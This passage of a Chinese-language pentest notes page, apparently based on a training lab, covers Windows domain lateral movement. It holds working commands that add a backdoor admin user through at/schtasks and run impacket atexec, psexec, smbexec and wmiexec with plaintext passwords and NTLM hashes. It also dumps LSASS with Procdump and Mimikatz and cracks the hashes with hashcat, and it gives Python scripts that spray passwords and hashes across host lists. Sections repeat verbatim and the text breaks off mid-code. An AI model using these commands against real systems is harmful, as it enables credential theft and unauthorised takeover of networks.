+<p>（6）1326：账号密码错误</p>
+<p>（7）1792：目标 NetLogon 服务未启动，连接域控常常会出现此情况</p>
+<p>（8）2242：用户密码过期，目标有账号策略，强制定期更改密码</p>
+<p>建立 IPC 失败的原因</p>
+<p>（1）目标系统不是 NT 或以上的操作系统</p>
+<p>（2）对方没有打开 IPC$共享</p>
+<p>（3）对方未开启 139、445 端口，或者被防火墙屏蔽</p>
+<p>（4）输出命令、账号密码有错误</p>
+<p>[at] &amp; [schtasks]</p>
+<p>●at &lt; Windows2012</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-comment"># 建立 ipc 连接：</span><br>net use <span class="hljs-string">\\192.168.3.21\ipc$</span> <span class="hljs-string">&quot;Admin12345&quot;</span> /user:god.org<span class="hljs-string">\ad</span> ministrator<br><br><span class="hljs-comment"># 拷贝执行文件到目标机器</span><br>copy add.bat <span class="hljs-string">\\192.168.3.21\c$</span><br><br><span class="hljs-comment"># add.bat</span><br>net user xiaodi qwe123!@<span class="hljs-comment">#X. /add</span><br><br><span class="hljs-comment">#添加计划任务</span><br>at <span class="hljs-string">\\192.168.3.21</span> <span class="hljs-number">15</span>:<span class="hljs-number">47</span> c:<span class="hljs-string">\add.bat</span> <br><br>LIVESCRIPT<br></code></pre></td></tr></table></figure>
+
+<p>●schtasks &gt;&#x3D;Windows2012</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 建立 ipc 连接：</span><br>net use \\192.168.3.32\ipc$ <span class="hljs-string">&quot;admin!@#45&quot;</span> <span class="hljs-string">/user</span><span class="hljs-function">:god.org</span>\administrator<br><br><span class="hljs-comment"># 复制文件到其 C 盘</span><br>copy add.bat \\192.168.3.32\c$ <br><br><span class="hljs-comment"># 创建 adduser 任务 对应执行文件</span><br>schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/s</span> 192.168.3.32 <span class="hljs-string">/ru</span> <span class="hljs-string">&quot;SYSTEM&quot;</span> <span class="hljs-string">/tn</span> adduser <span class="hljs-string">/sc</span> DAILY <span class="hljs-string">/tr</span> c:\add.bat <span class="hljs-string">/F</span> <br><br><span class="hljs-comment"># 运行 adduser 任务</span><br>schtasks <span class="hljs-string">/run</span> <span class="hljs-string">/s</span> 192.168.3.32 <span class="hljs-string">/tn</span> adduser <span class="hljs-string">/i</span><br><br><span class="hljs-comment"># 删除 adduser 任务</span><br>schtasks <span class="hljs-string">/delete</span> <span class="hljs-string">/s</span> 192.168.3.21 <span class="hljs-string">/tn</span> adduser <span class="hljs-string">/f</span><br><br>JBOSS-CLI<br></code></pre></td></tr></table></figure>
+
+<h3 id="7-横向渗透明文-HASH-传递-atexec-impacket"><a href="#7-横向渗透明文-HASH-传递-atexec-impacket" class="headerlink" title="7.横向渗透明文 HASH 传递 atexec-impacket"></a>7.横向渗透明文 HASH 传递 atexec-impacket</h3><p>Impacket官方仓库</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
+<p>EXE打包版</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs llvm">atexec.exe ./administrator:Admin<span class="hljs-number">12345</span><span class="hljs-title">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span> <span class="hljs-string">&quot;whoami&quot;</span><br><br>atexec.exe god/administrator:Admin<span class="hljs-number">12345</span><span class="hljs-title">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span> <span class="hljs-string">&quot;whoami&quot;</span><br><br>atexec.exe -hashes :ccef<span class="hljs-number">208</span><span class="hljs-keyword">c</span><span class="hljs-number">6485269</span><span class="hljs-keyword">c</span><span class="hljs-number">20</span>db<span class="hljs-number">2</span>cad<span class="hljs-number">21734</span>fe<span class="hljs-number">7</span> ./administrator<span class="hljs-title">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span> <span class="hljs-string">&quot;whoami&quot;</span><br><br>LLVM<br></code></pre></td></tr></table></figure>
+
+<h3 id="8-横向渗透明文-HASH-传递批量利用-综合"><a href="#8-横向渗透明文-HASH-传递批量利用-综合" class="headerlink" title="8.横向渗透明文 HASH 传递批量利用-综合"></a>8.横向渗透明文 HASH 传递批量利用-综合</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-comment">#批量检测 IP 对应明文连接</span><br><span class="hljs-title class_">FOR</span> /F %%i <span class="hljs-keyword">in</span> (ips.txt) <span class="hljs-keyword">do</span> net <span class="hljs-keyword">use</span> \\%%i\ipc<span class="hljs-variable">$ </span><span class="hljs-string">&quot;admin!@#45&quot;</span> /<span class="hljs-symbol">user:</span>administrator<br><br><span class="hljs-comment">#批量检测 IP 对应明文 回显版</span><br><span class="hljs-title class_">FOR</span> /F %%i <span class="hljs-keyword">in</span> (ips.txt) <span class="hljs-keyword">do</span> atexec.exe ./<span class="hljs-symbol">administrator:</span>admin!@<span class="hljs-comment">#45@%%i whoami</span><br><br><span class="hljs-comment">#批量检测明文对应 IP 回显版</span><br><span class="hljs-title class_">FOR</span> /F %%i <span class="hljs-keyword">in</span> (pass.txt) <span class="hljs-keyword">do</span> atexec.exe ./<span class="hljs-symbol">administrator:</span>%%i<span class="hljs-variable">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span> whoami<br><br><span class="hljs-comment"># 批量检测 HASH 对应 IP 回显版</span><br><span class="hljs-title class_">FOR</span> /F %%i <span class="hljs-keyword">in</span> (hash.txt) <span class="hljs-keyword">do</span> atexec.exe -hashes <span class="hljs-symbol">:%%i</span> ./administrator<span class="hljs-variable">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span> whoami<br><br><span class="hljs-title class_">ELIXIR</span><br></code></pre></td></tr></table></figure>
+
+<p>案例 4-横向渗透明文 HASH 传递批量利用-升级版</p>
+<p>前期除了收集明文密码HASH等，还收集了用户名，用户名配合密码字典能吃西瓜？</p>
+<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs nsis">pip install pyinstaller<br><br>pyinstaller -F fuck_neiwang_001.py<br><br>POWERSHELL<br>import os,time<br><br>ips = &#123;<br><br>&#125;<br><br>\<span class="hljs-comment"># net user /domain</span><br><br>users = &#123;<br><br>	<span class="hljs-string">&#x27;Administrator&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;dbadmin&#x27;</span><br><br>&#125;<br><br>passs = &#123;<br><br>    <br><br>&#125;<br><br>for ip in ips:<br><br>	for <span class="hljs-literal">user</span> in users:<br><br>        for mima in passs:<br><br>            <span class="hljs-keyword">exec</span> = <span class="hljs-string">&quot;net use \\&quot;</span> + ip + <span class="hljs-string">&#x27;\ipc$&#x27;</span> + mima + <span class="hljs-string">&#x27; /user:god\\&#x27;</span> + <span class="hljs-literal">user</span><br><br>            <span class="hljs-literal">print</span>(<span class="hljs-string">&#x27;---&gt;&#x27;</span> + <span class="hljs-keyword">exec</span> + <span class="hljs-string">&#x27;&lt;---&#x27;</span>)<br><br>            os.<span class="hljs-params">system</span>(<span class="hljs-keyword">exec</span>)<br><br>            time.<span class="hljs-keyword">sleep</span>(<span class="hljs-number">1</span>)<br><br>PYTHON<br></code></pre></td></tr></table></figure>
+
+<p>案例 1-Procdump+Mimikatz 配合获取</p>
+<p>目标机器上执行：</p>
+<p>procdump -accepteula -ma lsass.exe lsass.dmp</p>
+<p>本机 mimikatz 上执行：</p>
+<p>sekurlsa::minidump lsass.dmp<br>sekurlsa::logonPasswords full</p>
+<p>●其他工具：</p>
+<p>Pwdump7</p>
+<p>QuarksPwdump</p>
+<p>●HASH破解：</p>
+<p>hashcat -a0 -m 1000 hash file –force</p>
+<p><a target="_blank" rel="noopener" href="https://ophcrack.sourceforge.io/tables.php">免费彩虹表下载</a></p>
+<p>案例 2-域横向移动 SMB 服务利用-psexec,smbexec(官方自带)</p>
+<p>利用 SMB 服务可以通过明文或 hash 传递来远程执行，条件 445 端口开放。</p>
+<p>●psexec 第一种：先有 ipc 链接，psexec 需要明文或 hash 传递</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">net</span> use \\<span class="hljs-number">192.168.3.32</span>\ipc$ <span class="hljs-string">&quot;admin!@#45&quot;</span> /user:administrator<br><br><span class="hljs-comment"># 需要先有 ipc 链接 -s 以 System 权限运行</span><br>psexec \\<span class="hljs-number">192.168.3.32</span> -s cmd <br><br>NGINX<br></code></pre></td></tr></table></figure>
+
+<p>●psexec 第二种：不用建立 IPC 直接提供明文账户密码</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs elixir">psexec \\<span class="hljs-number">192.168</span>.<span class="hljs-number">3.21</span> -u administrator -p <span class="hljs-title class_">Admin12345</span> -s cmd<br><br><span class="hljs-comment"># 官方 Pstools 无法 采用 hash 连接</span><br><span class="hljs-comment"># 非官方自带-参考 impacket 工具包使用，操作简单，容易被杀</span><br>psexec -hashes <span class="hljs-symbol">:</span><span class="hljs-variable">$HASH</span><span class="hljs-variable">$ </span>./administrator<span class="hljs-variable">@10</span>.<span class="hljs-number">1.2</span>.<span class="hljs-number">3</span><br>psexec -hashes <span class="hljs-symbol">:</span><span class="hljs-variable">$HASH</span><span class="hljs-variable">$ </span>domain/administrator<span class="hljs-variable">@10</span>.<span class="hljs-number">1.2</span>.<span class="hljs-number">3</span><br>psexec -hashes <span class="hljs-symbol">:</span><span class="hljs-number">518</span>b98ad4178a53695dc997aa02d455c ./administrator<span class="hljs-variable">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">32</span> <br><br><span class="hljs-title class_">ELIXIR</span><br></code></pre></td></tr></table></figure>
+
+<p>●smbexec 无需先 ipc 链接 明文或 hash 传递（第三方库）</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs elixir">smbexec god/<span class="hljs-symbol">administrator:</span><span class="hljs-title class_">Admin12345</span><span class="hljs-variable">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span><br>smbexec ./<span class="hljs-symbol">administrator:</span>admin!@<span class="hljs-comment">#45@192.168.3.32</span><br>smbexec -hashes <span class="hljs-symbol">:</span><span class="hljs-variable">$HASH</span><span class="hljs-variable">$ </span>./admin<span class="hljs-variable">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span><br>smbbexec -hashes <span class="hljs-symbol">:</span><span class="hljs-variable">$HASH</span><span class="hljs-variable">$ </span>domain/admin<span class="hljs-variable">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span><br>smbexec -hashes <span class="hljs-symbol">:</span><span class="hljs-number">518</span>b98ad4178a53695dc997aa02d455c ./administrator<span class="hljs-variable">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">32</span><br>smbexec -hashes <span class="hljs-symbol">:ccef208c6485269c20db2cad21734fe7</span> god/administrator<span class="hljs-variable">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span><br><br><span class="hljs-title class_">ELIXIR</span><br></code></pre></td></tr></table></figure>
+
+<p>案例 3-域横向移动 WMI 服务利用-cscript,wmiexec,wmic</p>
+<p>WMI(Windows Management Instrumentation) 是通过 135 端口进行利用，支持用户名明文或者 hash 的方式进行认证，并且该方法不会在目标日志系统留下痕迹。</p>
+<p>●自带 WMIC 明文传递 无回显</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic /node:<span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.21</span> /<span class="hljs-keyword">user</span>:administrator /<span class="hljs-keyword">password</span>:Admin12345 process <span class="hljs-keyword">call</span> <span class="hljs-keyword">create</span> &quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;<br><br>PGSQL<br></code></pre></td></tr></table></figure>
+
+<p>●自带 cscript 明文传递 有回显</p>
+<p>wmiexec v1.1</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345<br><br>AWK<br></code></pre></td></tr></table></figure>
+
+<p>●套件 impacket wmiexec 明文或 hash 传递 有回显 exe 版本</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs llvm">wmiexec ./administrator:admin!@<span class="hljs-variable">#45</span><span class="hljs-title">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">32</span> <span class="hljs-string">&quot;whoami&quot;</span><br><br>wmiexec god/administrator:Admin<span class="hljs-number">12345</span><span class="hljs-title">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span> <span class="hljs-string">&quot;whoami&quot;</span><br><br>wmiexec -hashes :<span class="hljs-number">518</span>b<span class="hljs-number">98</span>ad<span class="hljs-number">4178</span>a<span class="hljs-number">53695</span>dc<span class="hljs-number">997</span>aa<span class="hljs-number">02</span>d<span class="hljs-number">455</span><span class="hljs-keyword">c</span> ./administrator<span class="hljs-title">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">32</span> <span class="hljs-string">&quot;whoami&quot;</span><br><br>wmiexec -hashes :ccef<span class="hljs-number">208</span><span class="hljs-keyword">c</span><span class="hljs-number">6485269</span><span class="hljs-keyword">c</span><span class="hljs-number">20</span>db<span class="hljs-number">2</span>cad<span class="hljs-number">21734</span>fe<span class="hljs-number">7</span> god/administrator<span class="hljs-title">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span> <span class="hljs-string">&quot;whoami&quot;</span><br><br>LLVM<br></code></pre></td></tr></table></figure>
+
+<p>案例 4-域横向移动以上服务 hash 批量利用-python 编译 exe</p>
+<p>pyinstaller.exe -F fuck_neiwang_002.py</p>
+<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs nsis">import os,time<br><br>ips=&#123;<br><br>    <span class="hljs-string">&#x27;192.168.3.21&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;192.168.3.25&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;192.168.3.29&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;192.168.3.30&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;192.168.3.32&#x27;</span><br><br>&#125;<br><br>users=&#123;<br><br>    <span class="hljs-string">&#x27;Administrator&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;boss&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;dbadmin&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;fileadmin&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;mack&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;mary&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;webadmin&#x27;</span><br><br>&#125;<br><br>hashs=&#123;<br><br>    <span class="hljs-string">&#x27;ccef208c6485269c20db2cad21734fe7&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;518b98ad4178a53695dc997aa02d455c&#x27;</span><br><br>&#125;<br><br>for ip in ips:<br><br>    for <span class="hljs-literal">user</span> in users:<br><br>        for mimahash in hashs:<br><br>            \<span class="hljs-comment">#wmiexec -hashes :hashgod/user@ipwhoami</span><br><br>            <span class="hljs-keyword">exec</span> = <span class="hljs-string">&quot;wmiexec -hashes :&quot;</span>+mimahash+<span class="hljs-string">&quot; god/&quot;</span>+<span class="hljs-literal">user</span>+<span class="hljs-string">&quot;@&quot;</span>+ip+<span class="hljs-string">&quot; whoami&quot;</span><br><br>            <span class="hljs-literal">print</span>(<span class="hljs-string">&#x27;---&gt;&#x27;</span> + <span class="hljs-keyword">exec</span> + <span class="hljs-string">&#x27;&lt;---&#x27;</span>)<br><br>            os.<span class="hljs-params">system</span>(<span class="hljs-keyword">exec</span>)<br><br>            time.<span class="hljs-keyword">sleep</span>(<span class="hljs-number">0.5</span>) <br><br>            exec1 = <span class="hljs-string">&quot;wmiexec -hashes :&quot;</span>+mimahash+<span class="hljs-string">&quot; god/&quot;</span>+<span class="hljs-literal">user</span>+<span class="hljs-string">&quot;@&quot;</span>+ip+<span class="hljs-string">&quot; whoami&quot;</span><br><br>            <span class="hljs-literal">print</span>(<span class="hljs-string">&#x27;---&gt;&#x27;</span> + exec1 + <span class="hljs-string">&#x27;&lt;---&#x27;</span>)<br><br>            os.<span class="hljs-params">system</span>(exec1)<br><br>            time.<span class="hljs-keyword">sleep</span>(<span class="hljs-number">0.5</span>)<br><br>PYTHON<br></code></pre></td></tr></table></figure>
+
+<h3 id="9-Procdump-Mimikatz-配合获取"><a href="#9-Procdump-Mimikatz-配合获取" class="headerlink" title="9.Procdump+Mimikatz 配合获取"></a>9.Procdump+Mimikatz 配合获取</h3><p>目标机器上执行：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">procdump -accepteula -ma lsass<span class="hljs-selector-class">.exe</span> lsass<span class="hljs-selector-class">.dmp</span><br><br>VIM<br></code></pre></td></tr></table></figure>
+
+<p>本机 mimikatz 上执行：</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lasso">sekurlsa<span class="hljs-type">::minidump</span> lsass.dmp<br>sekurlsa<span class="hljs-type">::logonPasswords</span> <span class="hljs-literal">full</span><br><br>LASSO<br></code></pre></td></tr></table></figure>
+
+<p>●其他工具：</p>
+<p>Pwdump7</p>
+<p>QuarksPwdump</p>
+<p>QuarksPwDump_v0.2b.zip(281 KB)</p>
+<p>●HASH破解：</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">hashcat -a0  -m <span class="hljs-number">1000</span> hash <span class="hljs-built_in">file</span> <span class="hljs-comment">--force</span><br><br>APPLESCRIPT<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://ophcrack.sourceforge.io/tables.php">免费彩虹表下载</a></p>
+<h3 id="10-域横向移动-SMB-服务利用-psexec-smbexec-官方自带"><a href="#10-域横向移动-SMB-服务利用-psexec-smbexec-官方自带" class="headerlink" title="10.域横向移动 SMB 服务利用-psexec,smbexec(官方自带)"></a>10.域横向移动 SMB 服务利用-psexec,smbexec(官方自带)</h3><p>利用 SMB 服务可以通过明文或 hash 传递来远程执行，条件 445 端口开放。</p>
+<p>●psexec 第一种：先有 ipc 链接，psexec 需要明文或 hash 传递</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">net</span> use \\<span class="hljs-number">192.168.3.32</span>\ipc$ <span class="hljs-string">&quot;admin!@#45&quot;</span> /user:administrator<br><br><span class="hljs-comment"># 需要先有 ipc 链接 -s 以 System 权限运行</span><br>psexec \\<span class="hljs-number">192.168.3.32</span> -s cmd <br><br>NGINX<br></code></pre></td></tr></table></figure>
+
+<p>●psexec 第二种：不用建立 IPC 直接提供明文账户密码</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs elixir">psexec \\<span class="hljs-number">192.168</span>.<span class="hljs-number">3.21</span> -u administrator -p <span class="hljs-title class_">Admin12345</span> -s cmd<br><br><span class="hljs-comment"># 官方 Pstools 无法 采用 hash 连接</span><br><span class="hljs-comment"># 非官方自带-参考 impacket 工具包使用，操作简单，容易被杀</span><br>psexec -hashes <span class="hljs-symbol">:</span><span class="hljs-variable">$HASH</span><span class="hljs-variable">$ </span>./administrator<span class="hljs-variable">@10</span>.<span class="hljs-number">1.2</span>.<span class="hljs-number">3</span><br>psexec -hashes <span class="hljs-symbol">:</span><span class="hljs-variable">$HASH</span><span class="hljs-variable">$ </span>domain/administrator<span class="hljs-variable">@10</span>.<span class="hljs-number">1.2</span>.<span class="hljs-number">3</span><br>psexec -hashes <span class="hljs-symbol">:</span><span class="hljs-number">518</span>b98ad4178a53695dc997aa02d455c ./administrator<span class="hljs-variable">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">32</span> <br><br><span class="hljs-title class_">ELIXIR</span><br></code></pre></td></tr></table></figure>
+
+<p>●smbexec 无需先 ipc 链接 明文或 hash 传递（第三方库）</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs elixir">smbexec god/<span class="hljs-symbol">administrator:</span><span class="hljs-title class_">Admin12345</span><span class="hljs-variable">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span><br>smbexec ./<span class="hljs-symbol">administrator:</span>admin!@<span class="hljs-comment">#45@192.168.3.32</span><br>smbexec -hashes <span class="hljs-symbol">:</span><span class="hljs-variable">$HASH</span><span class="hljs-variable">$ </span>./admin<span class="hljs-variable">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span><br>smbbexec -hashes <span class="hljs-symbol">:</span><span class="hljs-variable">$HASH</span><span class="hljs-variable">$ </span>domain/admin<span class="hljs-variable">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span><br>smbexec -hashes <span class="hljs-symbol">:</span><span class="hljs-number">518</span>b98ad4178a53695dc997aa02d455c ./administrator<span class="hljs-variable">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">32</span><br>smbexec -hashes <span class="hljs-symbol">:ccef208c6485269c20db2cad21734fe7</span> god/administrator<span class="hljs-variable">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span><br><br><span class="hljs-title class_">ELIXIR</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="11-域横向移动-WMI-服务利用-cscript-wmiexec-wmic"><a href="#11-域横向移动-WMI-服务利用-cscript-wmiexec-wmic" class="headerlink" title="11.域横向移动 WMI 服务利用-cscript,wmiexec,wmic"></a>11.域横向移动 WMI 服务利用-cscript,wmiexec,wmic</h3><p>WMI(Windows Management Instrumentation) 是通过 135 端口进行利用，支持用户名明文或者 hash 的方式进行认证，并且该方法不会在目标日志系统留下痕迹。</p>
+<p>●自带 WMIC 明文传递 无回显</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic /node:<span class="hljs-number">192.168</span><span class="hljs-number">.3</span><span class="hljs-number">.21</span> /<span class="hljs-keyword">user</span>:administrator /<span class="hljs-keyword">password</span>:Admin12345 process <span class="hljs-keyword">call</span> <span class="hljs-keyword">create</span> &quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;<br><br>PGSQL<br></code></pre></td></tr></table></figure>
+
+<p>●自带 cscript 明文传递 有回显</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345<br><br>AWK<br></code></pre></td></tr></table></figure>
+
+<p>●套件 impacket wmiexec 明文或 hash 传递 有回显 exe 版本</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs llvm">wmiexec ./administrator:admin!@<span class="hljs-variable">#45</span><span class="hljs-title">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">32</span> <span class="hljs-string">&quot;whoami&quot;</span><br><br>wmiexec god/administrator:Admin<span class="hljs-number">12345</span><span class="hljs-title">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span> <span class="hljs-string">&quot;whoami&quot;</span><br><br>wmiexec -hashes :<span class="hljs-number">518</span>b<span class="hljs-number">98</span>ad<span class="hljs-number">4178</span>a<span class="hljs-number">53695</span>dc<span class="hljs-number">997</span>aa<span class="hljs-number">02</span>d<span class="hljs-number">455</span><span class="hljs-keyword">c</span> ./administrator<span class="hljs-title">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">32</span> <span class="hljs-string">&quot;whoami&quot;</span><br><br>wmiexec -hashes :ccef<span class="hljs-number">208</span><span class="hljs-keyword">c</span><span 